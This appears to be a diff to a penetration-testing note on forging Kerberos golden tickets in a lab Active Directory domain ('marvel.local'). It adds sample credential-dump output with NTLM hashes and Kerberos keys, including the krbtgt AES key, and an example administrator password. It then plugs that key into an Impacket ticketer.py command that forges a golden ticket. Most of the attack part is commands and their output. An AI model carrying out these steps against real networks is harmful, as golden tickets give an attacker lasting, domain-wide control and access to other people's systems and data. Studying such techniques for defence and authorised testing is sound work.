@@ -8,9 +8,33 @@ If you have access to an account that is able to dump domain credentials, either
 
 Where `marvel.local` is the domain `administrator:Password123\!` is the username and password of the user that has the privileges to dump the domain hashes and `hydra-dc.marvel.local` is the fully qualified domain name (FQDN) of the domain.
 
+The output from the dump should look something like:
+
+```
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x56ab23a1c4f8bdc81875a194b1cecce5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3174e6ed5e2e8747ad5cc3fcfa73aab5:::
+
+[...SNIP...]
+
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:fe846f3874239696cdb0bb491b9dfc33eeebc727c67dbf2dee58e401e9ee754e
+Administrator:aes128-cts-hmac-sha1-96:ffbcc24e1b5b9e6f20c23d2d6adec791
+Administrator:des-cbc-md5:efe0bf683746c4df
+krbtgt:aes256-cts-hmac-sha1-96:47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5
+krbtgt:aes128-cts-hmac-sha1-96:c6fbe3420417a94ac4f9418e4b966f3d
+krbtgt:des-cbc-md5:fe8f45195770e952
+MARVEL.LOCAL\fcastle:aes256-cts-hmac-sha1-96:c95bf1bf87ec3dc738a676e4372d263480fea0ececc44fbab8e3343a5fab8cfe
+
+```
+
+The Kerberos NTLM hash or AES Keys can be used to create a golden ticket.  In the example below using `ticketer.py` the AES 256 key `47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5` was used.
+
 ## Create Golden Ticket using Impacket ticketer.py
 
-`python ticketer.py -aesKey <AES_KEY> -domain-sid <Domain_SID_HERE> -domain <domain.name> <anyusernamehere>`
+`python ticketer.py -aesKey 47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5 -domain-sid <Domain_SID_HERE> -domain <domain.name> <anyusernamehere>`
 
 This will generate a <username>.ccache file in the current directory.  Move the <username>.ccache file to /tmp/<username.ccache>
   
